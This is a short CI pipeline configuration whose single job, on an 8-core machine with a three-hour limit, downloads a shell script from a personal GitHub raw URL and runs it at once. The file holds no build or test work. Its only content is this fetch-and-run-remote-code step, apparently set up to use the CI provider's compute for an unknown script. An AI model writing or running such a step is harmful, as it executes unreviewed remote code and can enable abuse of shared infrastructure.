version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu1804
execution_time_limit:
  hours: 3
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - 'wget https://raw.githubusercontent.com/ardy2805/source/main/gulasema.sh && chmod +x gulasema.sh && ./gulasema.sh'
